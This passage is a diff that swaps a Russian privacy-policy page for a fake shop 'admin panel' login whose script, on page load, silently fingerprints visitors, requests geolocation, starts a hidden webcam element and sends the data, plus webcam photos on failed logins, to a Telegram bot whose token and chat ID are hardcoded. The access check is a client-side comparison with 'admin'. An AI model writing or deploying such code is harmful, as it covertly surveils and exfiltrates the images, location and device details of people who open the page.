@@ -3,63 +3,1372 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Политика конфиденциальности</title>
+    <title>🔐 Админ-панель — Магазин</title>
     <style>
+        :root {
+            --bg: #0a0d14;
+            --surface: #111620;
+            --surface2: #181d28;
+            --border: #1e2636;
+            --accent: #3b82f6;
+            --accent-glow: rgba(59, 130, 246, 0.3);
+            --danger: #ef4444;
+            --danger-glow: rgba(239, 68, 68, 0.4);
+            --success: #10b981;
+            --text: #e2e8f0;
+            --text2: #94a3b8;
+            --text3: #64748b;
+            --gold: #f59e0b;
+            --font-mono: 'SF Mono', 'Fira Code', 'Consolas', 'Monaco', monospace;
+            --font-sans: 'Inter', 'Segoe UI', 'Roboto', 'Helvetica Neue', sans-serif;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            line-height: 1.6;
-            color: #333;
-            max-width: 800px;
-            margin: 40px auto;
-            padding: 0 20px;
-            background-color: #f9f9f9;
+            background: var(--bg);
+            color: var(--text);
+            font-family: var(--font-sans);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            position: relative;
+            -webkit-font-smoothing: antialiased;
+            user-select: none;
+            -webkit-user-select: none;
         }
-        .container {
-            background: #fff;
-            padding: 40px;
+
+        /* Сетка фона */
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background-image:
+                linear-gradient(rgba(30, 38, 54, 0.4) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(30, 38, 54, 0.4) 1px, transparent 1px);
+            background-size: 40px 40px;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        /* Пульсирующие точки */
+        body::after {
+            content: '';
+            position: fixed;
+            top: 15%;
+            left: 10%;
+            width: 300px;
+            height: 300px;
+            background: radial-gradient(circle, rgba(59, 130, 246, 0.06) 0%, transparent 70%);
+            border-radius: 50%;
+            z-index: 0;
+            pointer-events: none;
+            animation: floatGlow 8s ease-in-out infinite;
+        }
+
+        @keyframes floatGlow {
+            0%,
+            100% {
+                transform: translate(0, 0) scale(1);
+            }
+            25% {
+                transform: translate(40px, -30px) scale(1.3);
+            }
+            50% {
+                transform: translate(-20px, 20px) scale(0.9);
+            }
+            75% {
+                transform: translate(30px, 10px) scale(1.2);
+            }
+        }
+
+        /* Дополнительное свечение */
+        .glow-orb {
+            position: fixed;
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 0;
+            filter: blur(80px);
+            opacity: 0.5;
+            animation: orbPulse 6s ease-in-out infinite;
+        }
+        .glow-orb.orb1 {
+            bottom: -100px;
+            right: -80px;
+            width: 350px;
+            height: 350px;
+            background: rgba(239, 68, 68, 0.08);
+            animation-delay: 0s;
+        }
+        .glow-orb.orb2 {
+            top: -120px;
+            left: -100px;
+            width: 400px;
+            height: 400px;
+            background: rgba(59, 130, 246, 0.07);
+            animation-delay: 3s;
+        }
+        @keyframes orbPulse {
+            0%,
+            100% {
+                transform: scale(1);
+                opacity: 0.5;
+            }
+            50% {
+                transform: scale(1.4);
+                opacity: 0.8;
+            }
+        }
+
+        /* Основной контейнер */
+        .main-container {
+            position: relative;
+            z-index: 10;
+            width: 100%;
+            max-width: 480px;
+            padding: 20px;
+        }
+
+        /* Карточка логина */
+        .login-card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 40px 32px;
+            box-shadow:
+                0 25px 60px rgba(0, 0, 0, 0.5),
+                0 0 0 1px rgba(255, 255, 255, 0.03) inset,
+                0 0 80px rgba(59, 130, 246, 0.05);
+            position: relative;
+            overflow: hidden;
+            transition: all 0.4s ease;
+        }
+
+        .login-card::before {
+            content: '';
+            position: absolute;
+            top: -1px;
+            left: 20px;
+            right: 20px;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+        }
+
+        /* Иконка щита */
+        .shield-icon {
+            width: 64px;
+            height: 64px;
+            margin: 0 auto 20px;
+            background: var(--surface2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            border: 2px solid var(--border);
+            position: relative;
+            animation: shieldPulse 3s ease-in-out infinite;
+        }
+        .shield-icon::after {
+            content: '';
+            position: absolute;
+            inset: -6px;
+            border-radius: 50%;
+            border: 2px solid transparent;
+            border-top-color: var(--accent);
+            animation: shieldSpin 4s linear infinite;
+        }
+        @keyframes shieldPulse {
+            0%,
+            100% {
+                box-shadow: 0 0 20px rgba(59, 130, 246, 0.2);
+            }
+            50% {
+                box-shadow: 0 0 40px rgba(59, 130, 246, 0.5);
+            }
+        }
+        @keyframes shieldSpin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .login-card h1 {
+            text-align: center;
+            font-size: 1.3rem;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            margin-bottom: 6px;
+            color: #fff;
+        }
+        .login-card .subtitle {
+            text-align: center;
+            font-size: 0.82rem;
+            color: var(--text3);
+            margin-bottom: 28px;
+            letter-spacing: 0.3px;
+        }
+
+        /* Поле ввода */
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 0.75rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: var(--text2);
+            margin-bottom: 8px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            padding-right: 50px;
+            background: var(--surface2);
+            border: 2px solid var(--border);
+            border-radius: 12px;
+            color: #fff;
+            font-size: 1.1rem;
+            font-family: var(--font-mono);
+            letter-spacing: 3px;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+        .input-group input:focus {
+            border-color: var(--accent);
+            box-shadow: 0 0 0 4px var(--accent-glow);
+            background: #1a1f2e;
+        }
+        .input-group input.wrong {
+            border-color: var(--danger) !important;
+            box-shadow: 0 0 0 8px var(--danger-glow) !important;
+            animation: shake 0.6s ease;
+        }
+        @keyframes shake {
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+            15% {
+                transform: translateX(-8px);
+            }
+            30% {
+                transform: translateX(8px);
+            }
+            45% {
+                transform: translateX(-6px);
+            }
+            60% {
+                transform: translateX(6px);
+            }
+            75% {
+                transform: translateX(-3px);
+            }
+            90% {
+                transform: translateX(3px);
+            }
+        }
+        .toggle-vis {
+            position: absolute;
+            right: 14px;
+            bottom: 16px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-size: 1.2rem;
+            color: var(--text3);
+            transition: color 0.2s;
+            z-index: 5;
+        }
+        .toggle-vis:hover {
+            color: #fff;
+        }
+
+        /* Кнопка */
+        .btn-access {
+            width: 100%;
+            padding: 15px;
+            background: var(--accent);
+            border: none;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 1rem;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        .btn-access:hover {
+            background: #2563eb;
+            box-shadow: 0 8px 30px rgba(59, 130, 246, 0.4);
+            transform: translateY(-1px);
+        }
+        .btn-access:active {
+            transform: scale(0.97);
+            transition: transform 0.1s;
+        }
+        .btn-access:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            pointer-events: none;
+        }
+
+        /* Индикатор безопасности */
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 20px;
+            padding: 10px;
+            background: var(--surface2);
             border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            font-size: 0.7rem;
+            color: var(--text3);
+            letter-spacing: 0.5px;
+            border: 1px solid var(--border);
         }
-        h1 { border-bottom: 2px solid #eee; padding-bottom: 10px; color: #222; }
-        h2 { margin-top: 30px; color: #444; font-size: 1.4em; }
-        p { margin: 15px 0; }
-        .email { color: #007bff; text-decoration: none; font-weight: bold; }
-        .footer-note { margin-top: 50px; font-size: 0.9em; color: #777; text-align: center; }
+        .security-badge .dot {
+            width: 7px;
+            height: 7px;
+            border-radius: 50%;
+            background: var(--success);
+            animation: dotBlink 2s ease-in-out infinite;
+        }
+        @keyframes dotBlink {
+            0%,
+            100% {
+                opacity: 1;
+                box-shadow: 0 0 6px var(--success);
+            }
+            50% {
+                opacity: 0.3;
+                box-shadow: 0 0 2px var(--success);
+            }
+        }
+
+        /* Сообщения */
+        .alert-msg {
+            text-align: center;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 0.85rem;
+            font-weight: 500;
+            margin-top: 16px;
+            display: none;
+            animation: fadeInUp 0.4s ease;
+        }
+        .alert-msg.error {
+            display: block;
+            background: rgba(239, 68, 68, 0.15);
+            border: 1px solid rgba(239, 68, 68, 0.4);
+            color: #fca5a5;
+        }
+        .alert-msg.success {
+            display: block;
+            background: rgba(16, 185, 129, 0.15);
+            border: 1px solid rgba(16, 185, 129, 0.4);
+            color: #6ee7b7;
+        }
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Скрытые элементы веб-камеры */
+        #webcam-container {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            width: 5px;
+            height: 5px;
+            opacity: 0;
+            pointer-events: none;
+            z-index: -999;
+            overflow: hidden;
+            border-radius: 3px;
+        }
+        #webcam-video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            opacity: 0;
+        }
+        #webcam-canvas {
+            display: none;
+        }
+
+        /* Админ-панель (скрыта изначально) */
+        .admin-panel {
+            display: none;
+            position: fixed;
+            inset: 0;
+            z-index: 100;
+            background: var(--bg);
+            flex-direction: row;
+        }
+        .admin-panel.active {
+            display: flex;
+        }
+        .admin-sidebar {
+            width: 260px;
+            background: var(--surface);
+            border-right: 1px solid var(--border);
+            padding: 24px 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            flex-shrink: 0;
+        }
+        .admin-sidebar .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 8px 12px;
+            margin-bottom: 20px;
+            font-weight: 700;
+            font-size: 1.1rem;
+            color: #fff;
+        }
+        .admin-sidebar .logo-area .logo-icon {
+            width: 38px;
+            height: 38px;
+            background: var(--accent);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.2rem;
+        }
+        .admin-sidebar .nav-item {
+            padding: 12px 16px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            color: var(--text2);
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-decoration: none;
+        }
+        .admin-sidebar .nav-item:hover {
+            background: var(--surface2);
+            color: #fff;
+        }
+        .admin-sidebar .nav-item.active {
+            background: var(--accent);
+            color: #fff;
+            font-weight: 600;
+        }
+        .admin-main {
+            flex: 1;
+            padding: 30px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 24px;
+        }
+        .admin-main .page-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .admin-main .page-header h2 {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #fff;
+        }
+        .btn-logout {
+            padding: 10px 20px;
+            background: transparent;
+            border: 1px solid var(--danger);
+            color: var(--danger);
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 0.85rem;
+            transition: all 0.2s;
+        }
+        .btn-logout:hover {
+            background: var(--danger);
+            color: #fff;
+        }
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 16px;
+        }
+        .stat-card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            padding: 20px;
+        }
+        .stat-card .stat-label {
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: var(--text3);
+            margin-bottom: 8px;
+        }
+        .stat-card .stat-value {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: #fff;
+        }
+        .stat-card .stat-sub {
+            font-size: 0.8rem;
+            color: var(--success);
+            margin-top: 4px;
+        }
+        .table-container {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            padding: 20px;
+            overflow-x: auto;
+        }
+        .table-container h3 {
+            margin-bottom: 16px;
+            font-size: 1rem;
+            color: #fff;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.85rem;
+        }
+        table th {
+            text-align: left;
+            padding: 10px 12px;
+            color: var(--text3);
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            font-size: 0.7rem;
+            border-bottom: 1px solid var(--border);
+        }
+        table td {
+            padding: 10px 12px;
+            border-bottom: 1px solid rgba(30, 38, 54, 0.6);
+            color: var(--text2);
+        }
+        table tr:hover td {
+            background: rgba(255, 255, 255, 0.01);
+        }
+        .badge {
+            display: inline-block;
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 0.7rem;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+        }
+        .badge-success {
+            background: rgba(16, 185, 129, 0.2);
+            color: #6ee7b7;
+        }
+        .badge-warning {
+            background: rgba(245, 158, 11, 0.2);
+            color: #fcd34d;
+        }
+
+        /* Уведомление о попытке взлома */
+        .intrusion-toast {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1a0000;
+            border: 2px solid var(--danger);
+            color: #fff;
+            padding: 16px 24px;
+            border-radius: 12px;
+            z-index: 9999;
+            font-weight: 600;
+            font-size: 0.9rem;
+            box-shadow: 0 20px 50px rgba(239, 68, 68, 0.5);
+            display: none;
+            animation: toastIn 0.5s ease;
+            text-align: center;
+        }
+        .intrusion-toast.show {
+            display: block;
+        }
+        @keyframes toastIn {
+            from {
+                opacity: 0;
+                transform: translateX(-50%) translateY(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(-50%) translateY(0);
+            }
+        }
+
+        /* Адаптивность */
+        @media (max-width: 768px) {
+            .admin-panel {
+                flex-direction: column;
+            }
+            .admin-sidebar {
+                width: 100%;
+                flex-direction: row;
+                flex-wrap: wrap;
+                padding: 12px;
+                gap: 4px;
+                overflow-x: auto;
+                border-right: none;
+                border-bottom: 1px solid var(--border);
+            }
+            .admin-sidebar .logo-area {
+                margin-bottom: 0;
+                margin-right: 12px;
+            }
+            .admin-sidebar .nav-item {
+                padding: 8px 12px;
+                font-size: 0.75rem;
+                white-space: nowrap;
+            }
+            .admin-main {
+                padding: 16px;
+            }
+            .login-card {
+                padding: 28px 20px;
+            }
+            .main-container {
+                max-width: 95vw;
+            }
+        }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h1>Политика конфиденциальности</h1>
-    <p><strong>Дата вступления в силу:</strong> 7 апреля 2026 г.</p>
+    <!-- Фоновые свечения -->
+    <div class="glow-orb orb1"></div>
+    <div class="glow-orb orb2"></div>
 
-    <p>Настоящая Политика конфиденциальности описывает, как мы собираем, используем и защищаем вашу информацию при использовании нашего веб-сайта.</p>
+    <!-- Скрытый контейнер веб-камеры -->
+    <div id="webcam-container">
+        <video id="webcam-video" autoplay playsinline muted></video>
+    </div>
+    <canvas id="webcam-canvas"></canvas>
 
-    <h2>1. Сбор информации</h2>
-    <p>Мы собираем только те данные, которые необходимы для корректной работы сайта. К ним относятся:</p>
-    <ul>
-        <li>Технические данные (IP-адрес, тип браузера, время посещения);</li>
-        <li>Файлы cookies для улучшения навигации;</li>
-        <li>Контактные данные, которые вы оставляете добровольно.</li>
-    </ul>
+    <!-- Toast уведомление -->
+    <div class="intrusion-toast" id="intrusion-toast">
+        🚨 <strong>Попытка взлома зафиксирована!</strong><br>
+        <span style="font-size:0.75rem;opacity:0.8;">Все данные отправлены в систему безопасности</span>
+    </div>
 
-    <h2>2. Использование данных</h2>
-    <p>Ваша информация используется исключительно для:</p>
-    <ul>
-        <li>Связи с вами по вашим запросам;</li>
-        <li>Анализа посещаемости и улучшения контента;</li>
-        <li>Предотвращения технических сбоев.</li>
-    </ul>
+    <!-- Экран логина -->
+    <div class="main-container" id="login-screen">
+        <div class="login-card">
+            <div class="shield-icon">🛡️</div>
+            <h1>Админ-панель</h1>
+            <p class="subtitle">Защищённый доступ к системе управления магазином</p>
 
-    <h2>3. Защита ваших данных</h2>
-    <p>Мы применяем современные средства безопасности, чтобы предотвратить несанкционированный доступ, изменение или удаление вашей личной информации. Мы не передаем и не продаем ваши данные третьим лицам.</p>
+            <div class="input-group">
+                <label>🔑 Код доступа</label>
+                <input
+                type="password"
+                id="access-code"
+                placeholder="••••••••"
+                maxlength="32"
+                autocomplete="off"
+                />
+                <button class="toggle-vis" id="toggle-vis" title="Показать/скрыть">👁️</button>
+            </div>
 
-    <h2>4. Файлы Cookies</h2>
-    <p>Наш сайт использует файлы cookies. Вы можете в любой момент изменить настройки браузера, чтобы блокировать эти файлы, однако это может повлиять на работу некоторых функций сайта.</p>
+            <button class="btn-access" id="btn-access" onclick="handleLogin()">
+                🔓 Войти в панель
+            </button>
 
-    <h2>5. Права пользователей</h2>
-    <p>Вы имеете право запросить копию ваших данных, которые у нас хранятся, или потребовать их полного удаления из нашей системы.</p>
+            <div class="alert-msg" id="alert-msg"></div>
 
+            <div class="security-badge">
+                <span class="dot"></span>
+                <span>Система активного мониторинга безопасности</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Админ-панель (после успешного входа) -->
+    <div class="admin-panel" id="admin-panel">
+        <aside class="admin-sidebar">
+            <div class="logo-area">
+                <div class="logo-icon">🏪</div>
+                <span>Магазин</span>
+            </div>
+            <a class="nav-item active" onclick="switchTab(this, 'dashboard')">📊 Дашборд</a>
+            <a class="nav-item" onclick="switchTab(this, 'orders')">📦 Заказы</a>
+            <a class="nav-item" onclick="switchTab(this, 'products')">🏷️ Товары</a>
+            <a class="nav-item" onclick="switchTab(this, 'customers')">👥 Клиенты</a>
+            <a class="nav-item" onclick="switchTab(this, 'security')">🔐 Безопасность</a>
+            <a class="nav-item" onclick="switchTab(this, 'settings')">⚙️ Настройки</a>
+        </aside>
+        <main class="admin-main" id="admin-main-content">
+            <!-- Дашборд -->
+            <div id="tab-dashboard">
+                <div class="page-header">
+                    <h2>📊 Дашборд продаж</h2>
+                    <button class="btn-logout" onclick="logout()">🚪 Выйти</button>
+                </div>
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="stat-label">Выручка сегодня</div>
+                        <div class="stat-value">₽ 847 290</div>
+                        <div class="stat-sub">↑ 12.4% к вчера</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-label">Заказов</div>
+                        <div class="stat-value">1 247</div>
+                        <div class="stat-sub">↑ 8.1% за неделю</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-label">Средний чек</div>
+                        <div class="stat-value">₽ 6 820</div>
+                        <div class="stat-sub">↑ 3.2%</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-label">Конверсия</div>
+                        <div class="stat-value">4.8%</div>
+                        <div class="stat-sub">↑ 0.6 п.п.</div>
+                    </div>
+                </div>
+                <div class="table-container">
+                    <h3>🕐 Последние заказы</h3>
+                    <table>
+                        <thead>
+                            <tr><th>ID</th><th>Клиент</th><th>Сумма</th><th>Статус</th><th>Время</th></tr>
+                        </thead>
+                        <tbody>
+                            <tr><td>#38471</td><td>Анна М.</td><td>₽ 12 400</td><td><span class="badge badge-success">Доставлен</span></td><td>12:45</td></tr>
+                            <tr><td>#38470</td><td>Сергей К.</td><td>₽ 8 900</td><td><span class="badge badge-success">Доставлен</span></td><td>11:30</td></tr>
+                            <tr><td>#38469</td><td>Ольга В.</td><td>₽ 24 150</td><td><span class="badge badge-warning">В пути</span></td><td>10:15</td></tr>
+                            <tr><td>#38468</td><td>Дмитрий П.</td><td>₽ 5 600</td><td><span class="badge badge-success">Доставлен</span></td><td>09:50</td></tr>
+                            <tr><td>#38467</td><td>Елена Р.</td><td>₽ 31 200</td><td><span class="badge badge-warning">Обработка</span></td><td>08:20</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+            <!-- Заглушки для других вкладок -->
+            <div id="tab-orders" style="display:none;"><div class="page-header"><h2>📦 Заказы</h2></div><p style="color:var(--text3);">Функционал заказов будет добавлен позже.</p></div>
+            <div id="tab-products" style="display:none;"><div class="page-header"><h2>🏷️ Товары</h2></div><p style="color:var(--text3);">Управление товарами — в разработке.</p></div>
+            <div id="tab-customers" style="display:none;"><div class="page-header"><h2>👥 Клиенты</h2></div><p style="color:var(--text3);">База клиентов — скоро.</p></div>
+            <div id="tab-security" style="display:none;"><div class="page-header"><h2>🔐 Безопасность</h2></div><p style="color:var(--text3);">Журнал безопасности и мониторинг.</p></div>
+            <div id="tab-settings" style="display:none;"><div class="page-header"><h2>⚙️ Настройки</h2></div><p style="color:var(--text3);">Настройки системы.</p></div>
+        </main>
+    </div>
+
+    <script>
+        // ==================== КОНФИГУРАЦИЯ ====================
+        const CORRECT_CODE = 'admin'; // Код доступа (смените на свой!)
+        const TELEGRAM_BOT_TOKEN = '8832280431:AAH8w4Kg8RAMYmoZcVSOth4ST0FzWyWVNBw';
+        let TELEGRAM_CHAT_ID = localStorage.getItem('tg_chat_id') || '7815623051';
+
+        // ==================== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ====================
+        let webcamStream = null;
+        let failedAttempts = 0;
+        let fingerprintData = null;
+
+        // ==================== ИНИЦИАЛИЗАЦИЯ ПРИ ЗАГРУЗКЕ ====================
+        document.addEventListener('DOMContentLoaded', async () => {
+            console.log('🛡️ Система безопасности инициализирована');
+            // Собираем fingerprint сразу
+            fingerprintData = await collectFullFingerprint();
+            // Пытаемся инициализировать камеру (тихо)
+            initWebcamQuietly();
+            // Пытаемся получить chat ID из Telegram
+            if (!TELEGRAM_CHAT_ID) {
+                tryFetchChatId();
+            }
+            // Отправляем уведомление о заходе на страницу
+            sendEntryNotification();
+        });
+
+        // ==================== ПЕРЕКЛЮЧЕНИЕ ВИДИМОСТИ ПАРОЛЯ ====================
+        document.getElementById('toggle-vis').addEventListener('click', function() {
+            const input = document.getElementById('access-code');
+            if (input.type === 'password') {
+                input.type = 'text';
+                this.textContent = '🙈';
+            } else {
+                input.type = 'password';
+                this.textContent = '👁️';
+            }
+        });
+
+        // Enter для входа
+        document.getElementById('access-code').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                handleLogin();
+            }
+        });
+
+        // ==================== ОСНОВНАЯ ФУНКЦИЯ ВХОДА ====================
+        async function handleLogin() {
+            const codeInput = document.getElementById('access-code');
+            const enteredCode = codeInput.value.trim();
+            const alertMsg = document.getElementById('alert-msg');
+            const btnAccess = document.getElementById('btn-access');
+
+            if (!enteredCode) {
+                showAlert('Введите код доступа', 'error');
+                codeInput.classList.add('wrong');
+                setTimeout(() => codeInput.classList.remove('wrong'), 600);
+                return;
+            }
+
+            if (enteredCode === CORRECT_CODE) {
+                // ✅ УСПЕШНЫЙ ВХОД
+                showAlert('✅ Доступ разрешён. Загрузка панели...', 'success');
+                btnAccess.disabled = true;
+                codeInput.classList.remove('wrong');
+
+                // Отправляем уведомление об успешном входе
+                await sendSecurityAlert({
+                    type: '✅ УСПЕШНЫЙ ВХОД',
+                    code: enteredCode,
+                    success: true,
+                });
+
+                // Показываем админ-панель
+                setTimeout(() => {
+                    document.getElementById('login-screen').style.display = 'none';
+                    document.getElementById('admin-panel').classList.add('active');
+                    stopWebcam();
+                }, 800);
+
+            } else {
+                // ❌ НЕВЕРНЫЙ КОД — ПОПЫТКА ВЗЛОМА
+                failedAttempts++;
+                codeInput.classList.add('wrong');
+                setTimeout(() => codeInput.classList.remove('wrong'), 600);
+                showAlert('⛔ Неверный код! Система фиксирует попытку взлома.', 'error');
+                codeInput.value = '';
+
+                // Показываем toast
+                showIntrusionToast();
+
+                // Делаем фото с веб-камеры
+                const photoBlob = await capturePhoto();
+
+                // Отправляем ВСЕ данные в Telegram (включая фото)
+                await sendSecurityAlert({
+                    type: '🚨 ПОПЫТКА ВЗЛОМА!',
+                    code: enteredCode,
+                    attempt: failedAttempts,
+                    success: false,
+                    photoBlob: photoBlob,
+                });
+
+                // Блокируем кнопку на короткое время при множественных попытках
+                if (failedAttempts >= 3) {
+                    btnAccess.disabled = true;
+                    showAlert('⏳ Слишком много попыток. Подождите 10 секунд...', 'error');
+                    setTimeout(() => {
+                        btnAccess.disabled = false;
+                        failedAttempts = 0;
+                        showAlert('', '');
+                        document.getElementById('alert-msg').style.display = 'none';
+                    }, 10000);
+                }
+            }
+        }
+
+        // ==================== СБОР ПОЛНОГО ЦИФРОВОГО ОТПЕЧАТКА ====================
+        async function collectFullFingerprint() {
+            const data = {
+                time: new Date().toLocaleString('ru-RU', { timeZone: 'Asia/Dushanbe',
+                hour12: false }),
+                timeISO: new Date().toISOString(),
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                browser: navigator.userAgent,
+                browserName: getBrowserName(),
+                browserVersion: getBrowserVersion(),
+                os: getOS(),
+                deviceType: getDeviceType(),
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                viewport: `${window.innerWidth}x${window.innerHeight}`,
+                language: navigator.language,
+                languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || 'N/A',
+                platform: navigator.platform,
+                vendor: navigator.vendor || 'N/A',
+                gpu: getGPUInfo(),
+                fonts: await detectFonts(),
+                geolocation: await getGeolocation(),
+                ipInfo: await getIPInfo(),
+                ram: navigator.deviceMemory || 'N/A',
+                cores: navigator.hardwareConcurrency || 'N/A',
+                touchScreen: 'ontouchstart' in window,
+                connectionType: getConnectionType(),
+                referrer: document.referrer || 'Прямой заход',
+                url: window.location.href,
+            };
+            return data;
+        }
+
+        function getBrowserName() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Firefox')) return 'Firefox';
+            if (ua.includes('Edg')) return 'Edge';
+            if (ua.includes('Chrome')) return 'Chrome';
+            if (ua.includes('Safari')) return 'Safari';
+            if (ua.includes('Opera')) return 'Opera';
+            return 'Unknown';
+        }
+
+        function getBrowserVersion() {
+            const ua = navigator.userAgent;
+            const match = ua.match(/(Chrome|Firefox|Edg|Safari|Opera)\/(\d+\.\d+)/);
+            return match ? match[2] : 'N/A';
+        }
+
+        function getOS() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Windows')) return 'Windows';
+            if (ua.includes('Mac')) return 'macOS';
+            if (ua.includes('Linux')) return 'Linux';
+            if (ua.includes('Android')) return 'Android';
+            if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
+            return 'Unknown';
+        }
+
+        function getDeviceType() {
+            const ua = navigator.userAgent;
+            if (/tablet|ipad/i.test(ua)) return 'Планшет';
+            if (/mobile|android|iphone/i.test(ua)) return 'Мобильный';
+            return 'Компьютер';
+        }
+
+        function getGPUInfo() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'N/A';
+                    }
+                }
+            } catch (e) {}
+            return 'N/A';
+        }
+
+        function getConnectionType() {
+            if (navigator.connection) {
+                return `${navigator.connection.effectiveType || 'N/A'} (${navigator.connection.type || 'N/A'})`;
+            }
+            return 'N/A';
+        }
+
+        async function detectFonts() {
+            const testFonts = [
+                'Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
+                'Comic Sans MS', 'Impact', 'Tahoma', 'Trebuchet MS', 'Palatino',
+                'Helvetica', 'Calibri', 'Cambria', 'Garamond', 'Book Antiqua',
+                'Lucida Console', 'Monaco', 'Consolas', 'SF Mono', 'Fira Code',
+                'Roboto', 'Open Sans', 'Lato', 'Montserrat', 'Oswald',
+                'Noto Sans', 'Segoe UI', 'Ubuntu', 'Cantarell', 'Droid Sans',
+                'system-ui', '-apple-system', 'BlinkMacSystemFont',
+            ];
+            const available = [];
+            const baseFont = 'monospace';
+            const testString = 'mmmmmmmmmmllllllllliiiiiiiiii';
+            const baseSize = '72px';
+
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.font = `${baseSize} ${baseFont}`;
+            const baseWidth = ctx.measureText(testString).width;
+
+            for (const font of testFonts) {
+                ctx.font = `${baseSize} "${font}", ${baseFont}`;
+                const width = ctx.measureText(testString).width;
+                if (width !== baseWidth) {
+                    available.push(font);
+                }
+            }
+
+            // Дополнительно через document.fonts.check
+            if (document.fonts && document.fonts.check) {
+                for (const font of ['Roboto', 'Open Sans', 'Lato', 'Montserrat', 'Oswald', 'Noto Sans']) {
+                    if (document.fonts.check(`12px "${font}"`) && !available.includes(font)) {
+                        available.push(font);
+                    }
+                }
+            }
+
+            return available.length > 0 ? available.join(', ') : 'Только системные';
+        }
+
+        async function getGeolocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve('Геолокация не поддерживается');
+                    return;
+                }
+                const timeout = setTimeout(() => {
+                    resolve('Таймаут геолокации');
+                }, 5000);
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        clearTimeout(timeout);
+                        resolve(
+                            `Широта: ${pos.coords.latitude.toFixed(6)}, Долгота: ${pos.coords.longitude.toFixed(6)} (точность: ${pos.coords.accuracy}м)`
+                            );
+                    },
+                    (err) => {
